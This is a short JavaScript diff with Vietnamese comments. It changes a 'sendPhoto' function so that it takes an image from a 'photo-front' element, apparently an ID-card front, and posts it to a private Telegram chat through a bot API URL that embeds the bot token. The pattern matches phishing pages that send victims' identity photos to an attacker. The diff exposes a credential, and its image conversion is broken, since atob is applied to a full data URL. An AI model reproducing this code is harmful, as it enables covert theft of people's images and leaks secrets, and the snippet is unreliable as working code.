@@ -28,15 +28,17 @@
 
       // Hàm gửi ảnh
       function sendPhoto() {
-        // Lấy URL của ảnh
-        const photoUrl = document.getElementById("photo-front").src;
+        // Lấy ảnh từ canvas
+        const canvas = document.getElementById("photo-front");
+        const imageData = canvas.toDataURL("image/jpeg");
+        const base64Image = atob(imageData);
 
         // Gửi ảnh lên Telegram
         $.ajax({
           url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendPhoto",
           data: {
             "chat_id": -1002081721946,
-            "photo": photoUrl
+            "photo": base64Image
           },
           type: "POST"
         }).done(function() {
